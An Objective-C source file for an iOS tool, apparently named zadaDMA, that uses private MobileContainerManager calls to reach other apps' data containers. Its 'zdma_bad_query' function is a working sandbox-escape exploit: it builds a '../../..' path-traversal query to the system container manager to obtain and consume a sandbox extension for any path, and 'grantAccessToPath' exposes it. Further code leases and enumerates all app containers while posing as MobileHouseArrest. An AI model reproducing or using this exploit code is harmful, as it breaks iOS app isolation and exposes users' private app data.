#import "ContainerAccess.h"
#import <dlfcn.h>
#import <dispatch/dispatch.h>
#import <fcntl.h>
#import <objc/message.h>
#import <objc/runtime.h>
#import <stdbool.h>
#import <stdint.h>
#import <sys/stat.h>
#import <unistd.h>
#import <errno.h>
#import <stdio.h>
#import <stdlib.h>
#import <string.h>
#import <xpc/xpc.h>

// ---------------------------------------------------------------------------
// Private MobileContainerManager C API (libsystem_containermanager.dylib)
// ---------------------------------------------------------------------------
//
// The identifier setters take an XPC string, not a C string. Passing a raw
// char* makes the daemon-side decoder treat it as an XPC object and the
// process dies on the first setter (iOS 27). This mirrors 3105's
// ThreeOneOSFive/exploit/mcm_bridge.m exactly.

typedef void *(*zdma_query_create_fn)(void);
typedef void (*zdma_query_set_class_fn)(void *, uint64_t);
typedef void (*zdma_query_set_ids_fn)(void *, xpc_object_t);
typedef void (*zdma_query_set_group_fn)(void *, xpc_object_t);
typedef void (*zdma_query_set_flags_fn)(void *, uint64_t);
typedef void (*zdma_query_set_part_fn)(void *, uint64_t);
typedef void (*zdma_query_set_domain_fn)(void *, const char *);
typedef void *(*zdma_query_get_single_fn)(void *);
typedef void *(*zdma_query_get_error_fn)(void *);
typedef bool (*zdma_query_iterate_fn)(void *, id);
typedef void (*zdma_query_free_fn)(void *);
typedef int (*zdma_error_errno_fn)(void *);
typedef const char *(*zdma_error_message_fn)(void *);
typedef const char *(*zdma_object_get_path_fn)(void *);
typedef const char *(*zdma_object_get_identifier_fn)(void *);
typedef void *(*zdma_object_copy_fn)(void *);
typedef char *(*zdma_object_copy_token_fn)(void *);
typedef bool (*zdma_object_activate_fn)(void *, bool);
typedef void (*zdma_object_free_fn)(void *);
typedef int64_t (*zdma_ext_consume_fn)(const char *);
typedef int (*zdma_ext_release_fn)(int64_t);

typedef struct {
    bool loaded;
    void *handle;

    zdma_query_create_fn       query_create;
    zdma_query_set_class_fn    set_class;
    zdma_query_set_ids_fn      set_identifiers;
    zdma_query_set_group_fn    set_group;
    zdma_query_set_flags_fn    set_flags;
    zdma_query_set_part_fn     set_part;
    zdma_query_set_domain_fn   set_part_domain;
    zdma_query_get_single_fn   get_single;
    zdma_query_get_error_fn    get_last_error;
    zdma_query_iterate_fn      iterate;
    zdma_query_free_fn         query_free;

    zdma_error_errno_fn        error_errno;
    zdma_error_message_fn      error_message;

    zdma_object_get_path_fn    get_path;
    zdma_object_get_identifier_fn get_identifier;
    zdma_object_copy_fn        object_copy;
    zdma_object_copy_token_fn  copy_token;
    zdma_object_activate_fn    object_activate;
    zdma_object_free_fn        object_free;

    zdma_ext_consume_fn        ext_consume;
    zdma_ext_release_fn        ext_release;
} zdma_mcm_api;

@class ZDMAContainerLease;

static zdma_mcm_api gAPI;
static NSLock *gLock;
static NSMutableDictionary<NSString *, ZDMAContainerLease *> *gLeases;
static NSMutableDictionary<NSString *, NSNumber *> *gBadQueryHandles;

@interface ZDMAContainerLease : NSObject
@property (nonatomic, copy) NSString *bundleID;
@property (nonatomic, copy) NSString *rootPath;
@property (nonatomic) void *query;              // retained container_query_t
@property (nonatomic) void *object;             // retained container_object_copy
@property (nonatomic) int64_t extensionHandle;  // consumed sandbox extension
@end

@implementation ZDMAContainerLease
- (void)dealloc {
    if (_extensionHandle > 0 && gAPI.ext_release) {
        gAPI.ext_release(_extensionHandle);
    }
    if (_object && gAPI.object_free) {
        gAPI.object_free(_object);
    }
    if (_query && gAPI.query_free) {
        gAPI.query_free(_query);
    }
}
@end

static void zdma_load_api(void) {
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gLock = [NSLock new];
        gLeases = [NSMutableDictionary new];
        gBadQueryHandles = [NSMutableDictionary new];

        const char *paths[] = {
            "/usr/lib/system/libsystem_containermanager.dylib",
            "/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",
            NULL
        };
        for (int i = 0; paths[i] != NULL; i++) {
            gAPI.handle = dlopen(paths[i], RTLD_NOW | RTLD_GLOBAL);
            if (gAPI.handle) break;
        }
        if (!gAPI.handle) return;

#define ZDMA_LOAD(field, name) do { \
    *(void **)(&gAPI.field) = dlsym(gAPI.handle, name); \
} while (0)

        ZDMA_LOAD(query_create,     "container_query_create");
        ZDMA_LOAD(set_class,        "container_query_set_class");
        ZDMA_LOAD(set_identifiers,  "container_query_set_identifiers");
        ZDMA_LOAD(set_group,        "container_query_set_group_identifiers");
        ZDMA_LOAD(set_flags,        "container_query_operation_set_flags");
        ZDMA_LOAD(set_part,         "container_query_operation_set_part");
        ZDMA_LOAD(set_part_domain,  "container_query_operation_set_part_domain");
        ZDMA_LOAD(get_single,       "container_query_get_single_result");
        ZDMA_LOAD(get_last_error,   "container_query_get_last_error");
        ZDMA_LOAD(iterate,          "container_query_iterate_results_sync");
        ZDMA_LOAD(query_free,       "container_query_free");
        ZDMA_LOAD(error_errno,      "container_error_get_posix_errno");
        ZDMA_LOAD(error_message,    "container_error_get_message");
        ZDMA_LOAD(get_path,         "container_object_get_path");
        ZDMA_LOAD(get_identifier,   "container_object_get_identifier");
        ZDMA_LOAD(object_copy,      "container_object_copy");
        ZDMA_LOAD(copy_token,       "container_copy_sandbox_token");
        ZDMA_LOAD(object_activate,  "container_object_sandbox_extension_activate");
        ZDMA_LOAD(object_free,      "container_object_free");
#undef ZDMA_LOAD

        // libsystem_sandbox, not libsystem_containermanager. Prefer the global
        // namespace (libSystem re-exports it) and fall back to the handle.
        gAPI.ext_consume = (zdma_ext_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        if (!gAPI.ext_consume) {
            gAPI.ext_consume = (zdma_ext_consume_fn)dlsym(gAPI.handle, "sandbox_extension_consume");
        }
        gAPI.ext_release = (zdma_ext_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
        if (!gAPI.ext_release) {
            gAPI.ext_release = (zdma_ext_release_fn)dlsym(gAPI.handle, "sandbox_extension_release");
        }

        gAPI.loaded = gAPI.query_create && gAPI.set_class && gAPI.set_identifiers &&
                      gAPI.set_flags && gAPI.get_single && gAPI.query_free &&
                      gAPI.get_path && gAPI.object_copy && gAPI.copy_token &&
                      gAPI.object_activate && gAPI.object_free;
    });
}

static NSString *zdma_trace_path(void) {
    static NSString *path;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                            NSUserDomainMask, YES).firstObject;
        path = [docs stringByAppendingPathComponent:@"zdma-trace.log"];
    });
    return path;
}

/// Durable breadcrumb: written+fsynced before every risky MCM call so a crash
/// still leaves the last reached step on disk for the next launch.
static void zdma_trace(NSString *step) {
    if (step.length == 0) return;
    NSString *line = [NSString stringWithFormat:@"%.3f %@\n",
                      [NSDate date].timeIntervalSince1970, step];
    NSData *data = [line dataUsingEncoding:NSUTF8StringEncoding];
    const char *path = zdma_trace_path().fileSystemRepresentation;
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) return;
    write(fd, data.bytes, data.length);
    fsync(fd);
    close(fd);
}

static NSError *zdma_error(NSInteger code, NSString *desc, NSString *detail) {
    NSMutableDictionary *u = [NSMutableDictionary dictionary];
    u[NSLocalizedDescriptionKey] = desc.length ? desc : @"Container access failed";
    if (detail.length) u[NSLocalizedFailureReasonErrorKey] = detail;
    return [NSError errorWithDomain:@"zadaDMA.container" code:code userInfo:u];
}

static NSError *zdma_diag_error(NSInteger code, NSString *desc, NSArray<NSString *> *diag) {
    NSMutableDictionary *u = [NSMutableDictionary dictionary];
    u[NSLocalizedDescriptionKey] = desc.length ? desc : @"Container access failed";
    if (diag.count) {
        u[NSLocalizedFailureReasonErrorKey] = [diag componentsJoinedByString:@" | "];
        u[@"ZDMADiagnostics"] = diag;
    }
    return [NSError errorWithDomain:@"zadaDMA.container" code:code userInfo:u];
}

static bool zdma_safe_identifier(NSString *value) {
    if (![value isKindOfClass:[NSString class]]) return false;
    if (value.length == 0 || value.length > 255) return false;
    if ([value isEqualToString:@"."] || [value isEqualToString:@".."]) return false;
    static NSCharacterSet *allowed;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        allowed = [NSCharacterSet characterSetWithCharactersInString:
                   @"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"];
    });
    return [value rangeOfCharacterFromSet:allowed.invertedSet].location == NSNotFound;
}

/// /var/... and /private/var/... are the same container; X canonicalises to
/// /private/var and so do we (the MCM daemon hands out the /var form).
static NSString *zdma_normalize_path(NSString *path) {
    if (!path.length) return nil;
    if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]) {
        return [@"/private" stringByAppendingString:path];
    }
    return path;
}

static NSString *zdma_query_error_text(void *query) {
    if (!query || !gAPI.get_last_error) return nil;
    void *error = gAPI.get_last_error(query);
    if (!error) return nil;
    int posix = gAPI.error_errno ? gAPI.error_errno(error) : 0;
    const char *message = gAPI.error_message ? gAPI.error_message(error) : NULL;
    NSString *text = (message && message[0]) ? [NSString stringWithUTF8String:message] : nil;
    if (text.length && posix != 0) return [NSString stringWithFormat:@"%@ (posix %d)", text, posix];
    if (text.length) return text;
    if (posix != 0) return [NSString stringWithFormat:@"posix %d", posix];
    return nil;
}

// ---------------------------------------------------------------------------
// bad_query: legacy path-traversal sandbox extension grant used by X
// ---------------------------------------------------------------------------
static int64_t zdma_bad_query(const char *path, bool skipLstat, NSString *group, long alt) {
    if (!path || path[0] != '/') return -255;
    if (!skipLstat) {
        struct stat st;
        if (lstat(path, &st) != 0) return -254;
    }
    zdma_load_api();
    if (!gAPI.handle || !gAPI.query_create || !gAPI.set_class || !gAPI.set_group ||
        !gAPI.set_flags || !gAPI.set_part || !gAPI.set_part_domain ||
        !gAPI.get_single || !gAPI.query_free || !gAPI.copy_token || !gAPI.ext_consume) {
        return -1;
    }

    void *query = gAPI.query_create();
    if (!query) return -2;

    BOOL hasGroup = group.length != 0;
    NSString *groupValue = hasGroup ? group : @"systemgroup.com.apple.mobilegestaltcache";
    // 3105's bad_query.c: class 13 for the default gestalt system group,
    // class 7 when the caller supplies a group.
    gAPI.set_class(query, hasGroup ? 7 : 13);
    xpc_object_t groupIdentifier = xpc_string_create(groupValue.UTF8String);
    if (!groupIdentifier) {
        gAPI.query_free(query);
        return -2;
    }
    gAPI.set_group(query, groupIdentifier);
#if !OS_OBJECT_USE_OBJC
    xpc_release(groupIdentifier);
#endif
    gAPI.set_part(query, 3);

    char *domain = NULL;
    const char *format = hasGroup
        ? "../../../../../../../../..%s"   // 9 x ..
        : "../../../../../../../..%s";     // 8 x ..
    if (asprintf(&domain, format, path) < 0 || domain == NULL) {
        gAPI.query_free(query);
        return -2;
    }
    gAPI.set_part_domain(query, domain);
    free(domain);

    gAPI.set_flags(query, alt ? 0x800000000ULL : 0x8000000000ULL);

    void *result = gAPI.get_single(query);
    if (!result) {
        gAPI.query_free(query);
        return -3;
    }
    char *token = gAPI.copy_token(result);
    if (!token) {
        gAPI.query_free(query);
        return -4;
    }
    int64_t handle = gAPI.ext_consume(token);
    free(token);
    gAPI.query_free(query);
    return handle;
}

// ---------------------------------------------------------------------------
// Class-2 lease through container_query
// ---------------------------------------------------------------------------
static ZDMAContainerLease *zdma_lease_for_bundle(NSString *bundleID, NSString **failure) {
    if (!gAPI.loaded) {
        if (failure) *failure = @"MCM API nuk u ngarkua";
        return nil;
    }

    NSString *host = NSBundle.mainBundle.bundleIdentifier ?: @"?";
    zdma_trace([NSString stringWithFormat:@"lease:start %@", bundleID]);
    zdma_trace([NSString stringWithFormat:@"lease:host %@", host]);
    zdma_trace([NSString stringWithFormat:
                @"lease:api create=%p class=%p ids=%p flags=%p part=%p single=%p copy=%p act=%p",
                (void *)gAPI.query_create, (void *)gAPI.set_class,
                (void *)gAPI.set_identifiers, (void *)gAPI.set_flags,
                (void *)gAPI.set_part, (void *)gAPI.get_single,
                (void *)gAPI.object_copy, (void *)gAPI.object_activate]);

    // MCM only grants class-2 leases to processes that present themselves as
    // MobileHouseArrest. If the signer rewrote the bundle identifier, calling
    // container_query_* can take the process down instead of returning an
    // error, so refuse to enter the API in that case.
    if (![host isEqualToString:@"com.apple.mobile.MobileHouseArrest"]) {
        if (failure) {
            *failure = [NSString stringWithFormat:
                        @"host bundle ID = %@ (duhet com.apple.mobile.MobileHouseArrest)", host];
        }
        zdma_trace(@"lease:host-mismatch");
        return nil;
    }

    void *query = gAPI.query_create();
    if (!query) {
        if (failure) *failure = @"container_query_create dështoi";
        zdma_trace(@"lease:query-null");
        return nil;
    }
    zdma_trace([NSString stringWithFormat:@"lease:query %p", query]);

    zdma_trace(@"lease:set-class");
    gAPI.set_class(query, 2);

    zdma_trace(@"lease:set-ids");
    xpc_object_t identifier = xpc_string_create(bundleID.UTF8String);
    if (!identifier) {
        if (failure) *failure = @"xpc_string_create dështoi";
        zdma_trace(@"lease:ids-xpc-null");
        gAPI.query_free(query);
        return nil;
    }
    gAPI.set_identifiers(query, identifier);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif

    zdma_trace(@"lease:set-flags");
    gAPI.set_flags(query, 0x900000000ULL);
    zdma_trace(@"lease:set-part");
    if (gAPI.set_part) gAPI.set_part(query, 0);
    zdma_trace(@"lease:configured");

    void *result = gAPI.get_single(query);
    if (!result) {
        NSString *detail = zdma_query_error_text(query);
        if (failure) *failure = detail.length ? detail : @"daemon nuk ktheu rezultat";
        zdma_trace([NSString stringWithFormat:@"lease:no-result %@", detail ?: @""]);
        gAPI.query_free(query);
        return nil;
    }
    zdma_trace(@"lease:result");

    const char *pathC = gAPI.get_path ? gAPI.get_path(result) : NULL;
    if (!pathC || pathC[0] == '\0') {
        if (failure) *failure = @"container_object_get_path ktheu null";
        zdma_trace(@"lease:no-path");
        gAPI.query_free(query);
        return nil;
    }

    NSString *path = zdma_normalize_path([NSString stringWithUTF8String:pathC]);
    if (!path.isAbsolutePath) {
        if (failure) *failure = @"rruga e kontejnerit nuk është absolute";
        zdma_trace(@"lease:relative-path");
        gAPI.query_free(query);
        return nil;
    }
    zdma_trace([NSString stringWithFormat:@"lease:path %@", path]);

    // Match 3105's MCMRetainedLease.activate:: re-query, copy the object,
    // check the token, then let the daemon activate the extension.
    void *activationResult = gAPI.get_single(query);
    void *retained = activationResult ? gAPI.object_copy(activationResult) : NULL;
    zdma_trace(retained ? @"lease:copied" : @"lease:copy-null");
    if (!retained) {
        if (failure) *failure = @"container_object_copy ktheu null";
        zdma_trace(@"lease:no-activation-object");
        gAPI.query_free(query);
        return nil;
    }

    char *token = gAPI.copy_token(retained);
    bool tokenPresent = token && token[0] != '\0';
    zdma_trace(tokenPresent ? @"lease:token" : @"lease:no-token");

    bool activated = false;
    if (tokenPresent) {
        zdma_trace(@"lease:activating");
        activated = gAPI.object_activate(retained, false);
        zdma_trace(activated ? @"lease:activated" : @"lease:activate-false");
    }

    int64_t handle = -1;
    if (!activated && tokenPresent && gAPI.ext_consume) {
        zdma_trace(@"lease:consuming-token");
        handle = gAPI.ext_consume(token);
        zdma_trace([NSString stringWithFormat:@"lease:consumed=%lld",
                    (long long)handle]);
    }
    if (token) free(token);

    if (!activated && handle < 0) {
        gAPI.object_free(retained);
        gAPI.query_free(query);
        if (failure) *failure = tokenPresent
            ? @"sandbox extension nuk u aktivizua"
            : @"MCM object nuk përmban sandbox token";
        zdma_trace(@"lease:no-extension");
        return nil;
    }

    zdma_trace(@"lease:opening");
    int fd = open(path.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC);
    if (fd < 0) {
        int savedErrno = errno;
        if (handle > 0 && gAPI.ext_release) gAPI.ext_release(handle);
        if (retained && gAPI.object_free) gAPI.object_free(retained);
        gAPI.query_free(query);
        if (failure) {
            *failure = [NSString stringWithFormat:@"container root open failed errno=%d (%s)",
                        savedErrno, strerror(savedErrno)];
        }
        zdma_trace([NSString stringWithFormat:@"lease:open-failed errno=%d", savedErrno]);
        return nil;
    }
    close(fd);
    zdma_trace(@"lease:ok");

    ZDMAContainerLease *lease = [ZDMAContainerLease new];
    lease.bundleID = bundleID;
    lease.rootPath = path;
    lease.query = query;
    lease.object = retained;
    lease.extensionHandle = handle;
    return lease;
}

static NSString *zdma_scan_filesystem(NSString *bundleID, NSMutableArray<NSString *> *diag) {
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray<NSString *> *roots = @[
        @"/private/var/mobile/Containers/Data/Application",
        @"/var/mobile/Containers/Data/Application",
    ];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];
    for (NSString *root in roots) {
        NSArray<NSString *> *entries = [fm contentsOfDirectoryAtPath:root error:nil];
        if (entries.count == 0) {
            [diag addObject:[NSString stringWithFormat:@"FS %@: nuk lexohet", root]];
            continue;
        }
        unsigned long checked = 0;
        for (NSString *name in entries) {
            if (name.length == 0 || [name hasPrefix:@"."]) continue;
            NSString *dir = [root stringByAppendingPathComponent:name];
            if ([seen containsObject:dir]) continue;
            [seen addObject:dir];
            checked++;
            NSString *metadata = [dir stringByAppendingPathComponent:
                                  @".com.apple.mobile_container_manager.metadata.plist"];
            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:metadata];
            NSString *identifier = plist[@"MCMMetadataIdentifier"];
            if ([identifier isEqualToString:bundleID]) {
                return zdma_normalize_path(dir);
            }
        }
        [diag addObject:[NSString stringWithFormat:@"FS %@: %lu kontrolluar", root, checked]];
    }
    return nil;
}

static __attribute__((unused)) NSString *zdma_launchservices_container(NSString *bundleID) {
    @try {
    void *handle = dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices",
                          RTLD_LAZY);
    Class workspaceClass = NSClassFromString(@"LSApplicationWorkspace");
    if (!workspaceClass) {
        if (handle) dlclose(handle);
        return nil;
    }
    id workspace = [workspaceClass respondsToSelector:@selector(defaultWorkspace)]
        ? [workspaceClass performSelector:@selector(defaultWorkspace)] : nil;
    if (!workspace || ![workspace respondsToSelector:@selector(allInstalledApplications)]) {
        if (handle) dlclose(handle);
        return nil;
    }
    NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
    NSString *result = nil;
    for (id app in apps) {
        if (![app respondsToSelector:@selector(applicationIdentifier)]) continue;
        NSString *identifier = [app performSelector:@selector(applicationIdentifier)];
        if (![identifier isEqualToString:bundleID]) continue;
        NSURL *url = [app respondsToSelector:@selector(dataContainerURL)]
            ? [app performSelector:@selector(dataContainerURL)] : nil;
        if (!url && [app respondsToSelector:@selector(bundleContainerURL)]) {
            url = [app performSelector:@selector(bundleContainerURL)];
        }
        if (url.path.length) {
            result = zdma_normalize_path(url.path);
            break;
        }
    }
    if (handle) dlclose(handle);
    return result;
    } @catch (__unused NSException *exception) {
        return nil;
    }
}

// ---------------------------------------------------------------------------
@implementation ContainerAccess

+ (void)resetTrace {
    [[NSFileManager defaultManager] removeItemAtPath:zdma_trace_path() error:nil];
}

+ (void)note:(NSString *)step {
    zdma_trace(step);
}

+ (NSString *)traceTail {
    NSString *text = [NSString stringWithContentsOfFile:zdma_trace_path()
                                               encoding:NSUTF8StringEncoding
                                                  error:nil];
    return text ?: @"";
}

+ (BOOL)isAvailable {
    zdma_load_api();
    return gAPI.loaded ? YES : NO;
}

+ (NSString *)containerPathForBundleID:(NSString *)bundleID error:(NSError **)error {
    zdma_load_api();

    if (!zdma_safe_identifier(bundleID)) {
        if (error) {
            *error = zdma_error(EINVAL,
                                @"Bundle ID i pavlefshëm.",
                                @"Lejohen vetëm shkronja, numra, '.', '-' dhe '_' (max 255).");
        }
        return nil;
    }

    [gLock lock];
    ZDMAContainerLease *cached = gLeases[bundleID];
    [gLock unlock];
    if (cached.rootPath.length) {
        return cached.rootPath;
    }

    NSMutableArray<NSString *> *diag = [NSMutableArray array];
    zdma_trace([NSString stringWithFormat:@"resolve:begin %@", bundleID]);

    if (gAPI.loaded) {
        NSString *failure = nil;
        ZDMAContainerLease *lease = zdma_lease_for_bundle(bundleID, &failure);
        if (lease) {
            [gLock lock];
            gLeases[bundleID] = lease;
            [gLock unlock];
            return lease.rootPath;
        }
        [diag addObject:[NSString stringWithFormat:@"MCM class-2: %@",
                         failure.length ? failure : @"nuk u gjet"]];
    } else {
        [diag addObject:@"MCM: libsystem_containermanager ose simbolet mungojnë"];
    }

    // Fallbacks that rely on the path-traversal grant (bad_query) or private
    // LaunchServices calls are intentionally disabled in the write path: a
    // wrong guess kills the process instead of returning an error. The
    // filesystem scan is kept only as a read-only diagnostic.
    NSString *scanned = zdma_scan_filesystem(bundleID, diag);
    if (scanned.length) {
        [diag addObject:[NSString stringWithFormat:@"FS path (pa lease): %@", scanned]];
    }

    if (error) {
        *error = zdma_diag_error(ENOENT,
                                 [NSString stringWithFormat:@"Kontejneri i %@ nuk u gjet.", bundleID],
                                 diag);
    }
    return nil;
}

+ (BOOL)grantAccessToPath:(NSString *)path error:(NSError **)error {
    zdma_load_api();
    if (!path.length || !path.isAbsolutePath) {
        if (error) *error = zdma_error(EINVAL, @"Rruga e kontejnerit është e pavlefshme.", path);
        return NO;
    }
    if (!gAPI.loaded) {
        if (error) *error = zdma_error(ENOSYS, @"MCM API nuk u ngarkua.", nil);
        return NO;
    }

    int64_t handle = zdma_bad_query(path.fileSystemRepresentation, true, nil, 0);
    if (handle < 0) {
        NSString *detail = [NSString stringWithFormat:
                            @"bad_query kthoi %lld (path=%@, group=systemgroup.com.apple.mobilegestaltcache)",
                            (long long)handle, path];
        if (error) *error = zdma_error(EPERM, @"Sandbox extension dështoi.", detail);
        return NO;
    }

    [gLock lock];
    NSNumber *previous = gBadQueryHandles[path];
    gBadQueryHandles[path] = @(handle);
    [gLock unlock];
    if (previous && gAPI.ext_release) {
        gAPI.ext_release(previous.longLongValue);
    }
    return YES;
}

+ (NSArray<NSString *> *)enumerateAppContainerIdentifiers:(NSError **)error {
    zdma_load_api();
    if (!gAPI.loaded || gAPI.iterate == NULL || gAPI.get_identifier == NULL) {
        if (error) *error = zdma_error(ENOSYS, @"MCM enumeration nuk është e disponueshme.", nil);
        return nil;
    }

    void *query = gAPI.query_create();
    if (!query) {
        if (error) *error = zdma_error(EIO, @"container_query_create dështoi.", nil);
        return nil;
    }

    gAPI.set_class(query, 2);
    gAPI.set_flags(query, 0x100000000ULL);
    if (gAPI.set_part) gAPI.set_part(query, 0);

    NSMutableOrderedSet<NSString *> *identifiers = [NSMutableOrderedSet orderedSet];
    gAPI.iterate(query, ^bool(void *object) {
        if (!object) return false;
        const char *identifier = gAPI.get_identifier(object);
        if (identifier && identifier[0] != '\0') {
            NSString *value = [NSString stringWithUTF8String:identifier];
            if (value.length) [identifiers addObject:value];
        }
        return identifiers.count < 4096;
    });

    gAPI.query_free(query);

    if (identifiers.count == 0) {
        if (error) *error = zdma_error(ENOENT, @"MCM nuk ktheu asnjë kontejner.", nil);
        return nil;
    }
    return identifiers.array;
}

+ (NSArray<NSString *> *)listDirectory:(NSString *)path error:(NSError **)error {
    if (!path.length) {
        if (error) *error = zdma_error(EINVAL, @"Rrugë e pavlefshme.", nil);
        return nil;
    }
    NSError *readError = nil;
    NSArray<NSString *> *entries = [[NSFileManager defaultManager]
                                    contentsOfDirectoryAtPath:path error:&readError];
    if (!entries) {
        if (error) {
            *error = zdma_error(EACCES,
                                [NSString stringWithFormat:@"Nuk lexohet %@", path],
                                readError.localizedDescription);
        }
        return nil;
    }
    return entries;
}

+ (void)releaseAll {
    zdma_load_api();
    [gLock lock];
    [gLeases removeAllObjects];
    NSDictionary<NSString *, NSNumber *> *handles = [gBadQueryHandles copy];
    [gBadQueryHandles removeAllObjects];
    [gLock unlock];
    if (gAPI.ext_release) {
        for (NSNumber *handle in handles.allValues) {
            gAPI.ext_release(handle.longLongValue);
        }
    }
}

@end
